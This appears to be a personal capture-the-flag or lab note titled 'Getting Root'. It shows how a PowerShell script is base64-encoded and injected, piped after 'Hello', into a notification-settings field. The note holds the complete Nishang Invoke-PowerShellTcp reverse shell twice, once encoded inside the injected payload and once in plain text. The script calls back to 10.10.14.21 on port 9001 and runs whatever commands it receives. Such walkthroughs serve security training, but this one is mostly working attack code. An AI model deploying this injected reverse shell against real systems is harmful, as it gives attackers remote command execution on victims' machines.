# Getting Root
![[Pasted image 20211129164113.png]]

On Setup - Account Settings - Notifications

![[Pasted image 20211129152158.png]]

Has to convert the payload to base64, to prevent bad characteres
```bash
cat nishang.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
```

Payload

```powershell
Hello | powershell -enc ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAACgB7ACAACgA8ACMACgAuAFMAWQBOAE8AUABTAEkAUwAKAE4AaQBzAGgAYQBuAGcAIABzAGMAcgBpAHAAdAAgAHcAaABpAGMAaAAgAGMAYQBuACAAYgBlACAAdQBzAGUAZAAgAGYAbwByACAAUgBlAHYAZQByAHMAZQAgAG8AcgAgAEIAaQBuAGQAIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAZgByAG8AbQAgAGEAIAB0AGEAcgBnAGUAdAAuACAACgAKAC4ARABFAFMAQwBSAEkAUABUAEkATwBOAAoAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBiAGwAZQAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIABhACAAcwB0AGEAbgBkAGEAcgBkACAAbgBlAHQAYwBhAHQAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAGEAIABwAG8AcgB0ACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAgAAoAQQBsAHMAbwAsACAAYQAgAHMAdABhAG4AZABhAHIAZAAgAG4AZQB0AGMAYQB0ACAAYwBhAG4AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHMAYwByAGkAcAB0ACAAQgBpAG4AZAAgAHQAbwAgAGEAIABzAHAAZQBjAGkAZgBpAGMAIABwAG8AcgB0AC4ACgAKAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABkAGUAcgBpAHYAZQBkACAAZgByAG8AbQAgAFAAbwB3AGUAcgBmAHUAbgAgAHcAcgBpAHQAdABlAG4AIABiAHkAIABCAGUAbgAgAFQAdQByAG4AZQByACAAJgAgAEQAYQB2AGUAIABIAGEAcgBkAHkACgAKAC4AUABBAFIAQQBNAEUAVABFAFIAIABJAFAAQQBkAGQAcgBlAHMAcwAKAFQAaABlACAASQBQACAAYQBkAGQAcgBlAHMAcwAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB3AGgAZQBuACAAdQBzAGkAbgBnACAAdABoAGUAIAAtAFIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAuAAoACgAuAFAAQQBSAEEATQBFAFQARQBSACAAUABvAHIAdAAKAFQAaABlACAAcABvAHIAdAAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB3AGgAZQBuACAAdQBzAGkAbgBnACAAdABoAGUAIAAtAFIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAuACAAVwBoAGUAbgAgAHUAcwBpAG4AZwAgAC0AQgBpAG4AZAAgAGkAdAAgAGkAcwAgAHQAaABlACAAcABvAHIAdAAgAG8AbgAgAHcAaABpAGMAaAAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAgAGwAaQBzAHQAZQBuAHMALgAKAAoALgBFAFgAQQBNAFAATABFAAoAUABTACAAPgAgAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAgAC0AUgBlAHYAZQByAHMAZQAgAC0ASQBQAEEAZABkAHIAZQBzAHMAIAAxADkAMgAuADEANgA4AC4AMgA1ADQALgAyADIANgAgAC0AUABvAHIAdAAgADQANAA0ADQACgAKAEEAYgBvAHYAZQAgAHMAaABvAHcAcwAgAGEAbgAgAGUAeABhAG0AcABsAGUAIABvAGYAIABhAG4AIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcgBlAHYAZQByAHMAZQAgAGMAbwBuAG4AZQBjAHQAIABzAGgAZQBsAGwALgAgAEEAIABuAGUAdABjAGEAdAAvAHAAbwB3AGUAcgBjAGEAdAAgAGwAaQBzAHQAZQBuAGUAcgAgAG0AdQBzAHQAIABiAGUAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAAoAdABoAGUAIABnAGkAdgBlAG4AIABJAFAAIABhAG4AZAAgAHAAbwByAHQALgAgAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBCAGkAbgBkACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABiAGkAbgBkACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAuACAAVQBzAGUAIABhACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHAAbwByAHQALgAgAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBSAGUAdgBlAHIAcwBlACAALQBJAFAAQQBkAGQAcgBlAHMAcwAgAGYAZQA4ADAAOgA6ADIAMABjADoAMgA5AGYAZgA6AGYAZQA5AGQAOgBiADkAOAAzACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAGUAdgBlAHIAcwBlACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAgAG8AdgBlAHIAIABJAFAAdgA2AC4AIABBACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIABsAGkAcwB0AGUAbgBlAHIAIABtAHUAcwB0ACAAYgBlAAoAbABpAHMAdABlAG4AaQBuAGcAIABvAG4AIAB0AGgAZQAgAGcAaQB2AGUAbgAgAEkAUAAgAGEAbgBkACAAcABvAHIAdAAuACAACgAKAC4ATABJAE4ASwAKAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBsAGEAYgBvAGYAYQBwAGUAbgBlAHQAcgBhAHQAaQBvAG4AdABlAHMAdABlAHIALgBjAG8AbQAvADIAMAAxADUALwAwADUALwB3AGUAZQBrAC0AbwBmAC0AcABvAHcAZQByAHMAaABlAGwAbAAtAHMAaABlAGwAbABzAC0AZABhAHkALQAxAC4AaAB0AG0AbAAKAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AbgBlAHQAdABpAHQAdQBkAGUALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AcABvAHcAZQByAGYAdQBuAC4AcABzADEACgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAYQBtAHIAYQB0AGEAcwBoAG8AawAvAG4AaQBzAGgAYQBuAGcACgAjAD4AIAAgACAAIAAgACAACgAgACAAIAAgAFsAQwBtAGQAbABlAHQAQgBpAG4AZABpAG4AZwAoAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAgAFAAYQByAGEAbQAoAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAGYAYQBsAHMAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdAByAGkAbgBnAF0ACgAgACAAIAAgACAAIAAgACAAJABJAFAAQQBkAGQAcgBlAHMAcwAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAxACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAxACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAGIAaQBuAGQAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBJAG4AdABdAAoAIAAgACAAIAAgACAAIAAgACQAUABvAHIAdAAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBTAHcAaQB0AGMAaABdAAoAIAAgACAAIAAgACAAIAAgACQAUgBlAHYAZQByAHMAZQAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAGIAaQBuAGQAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBTAHcAaQB0AGMAaABdAAoAIAAgACAAIAAgACAAIAAgACQAQgBpAG4AZAAKAAoAIAAgACAAIAApAAoACgAgACAAIAAgAAoAIAAgACAAIAB0AHIAeQAgAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACMAQwBvAG4AbgBlAGMAdAAgAGIAYQBjAGsAIABpAGYAIAB0AGgAZQAgAHIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAgAGkAcwAgAHUAcwBlAGQALgAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAUgBlAHYAZQByAHMAZQApAAoAIAAgACAAIAAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABJAFAAQQBkAGQAcgBlAHMAcwAsACQAUABvAHIAdAApAAoAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAEIAaQBuAGQAIAB0AG8AIAB0AGgAZQAgAHAAcgBvAHYAaQBkAGUAZAAgAHAAbwByAHQAIABpAGYAIABCAGkAbgBkACAAcwB3AGkAdABjAGgAIABpAHMAIAB1AHMAZQBkAC4ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAEIAaQBuAGQAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABsAGkAcwB0AGUAbgBlAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgBdACQAUABvAHIAdAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AcwB0AGEAcgB0ACgAKQAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAgAD0AIAAkAGwAaQBzAHQAZQBuAGUAcgAuAEEAYwBjAGUAcAB0AFQAYwBwAEMAbABpAGUAbgB0ACgAKQAKACAAIAAgACAAIAAgACAAIAB9ACAACgAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAFMAZQBuAGQAIABiAGEAYwBrACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAbgBkACAAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAcwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAVwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgACIAIAArACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAgACsAIAAiACAAbwBuACAAIgAgACsAIAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAArACAAIgBgAG4AQwBvAHAAeQByAGkAZwBoAHQAIAAoAEMAKQAgADIAMAAxADUAIABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAuACAAQQBsAGwAIAByAGkAZwBoAHQAcwAgAHIAZQBzAGUAcgB2AGUAZAAuAGAAbgBgAG4AIgApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAIwBTAGgAbwB3ACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAcgBvAG0AcAB0AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAHMAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAnAFAAUwAgACcAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAnAD4AJwApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABFAG4AYwBvAGQAZQBkAFQAZQB4AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAkAEUAbgBjAG8AZABlAGQAVABlAHgAdAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBFAHgAZQBjAHUAdABlACAAdABoAGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAdABoAGUAIAB0AGEAcgBnAGUAdAAuAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACIAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAiACAACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACQAXwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAeAAgAD0AIAAoACQAZQByAHIAbwByAFsAMABdACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQByAHIAbwByAC4AYwBsAGUAYQByACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgACsAIAAkAHgACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAUgBlAHQAdQByAG4AIAB0AGgAZQAgAHIAZQBzAHUAbAB0AHMACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQAgACAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAFMAbwBtAGUAdABoAGkAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAQwBoAGUAYwBrACAAaQBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGkAcwAgAHIAZQBhAGMAaABhAGIAbABlACAAYQBuAGQAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAAdABoAGUAIABjAG8AcgByAGUAYwB0ACAAcABvAHIAdAAuACIAIAAKACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAkAF8ACgAgACAAIAAgAH0ACgB9AAoACgBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQAwAC4AMQAwAC4AMQA0AC4AMgAxACAALQBQAG8AcgB0ACAAOQAwADAAMQAKAA==
```

content of nishang.ps1
```powershell
function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.21 -Port 9001

```
![[Pasted image 20211129164918.png]]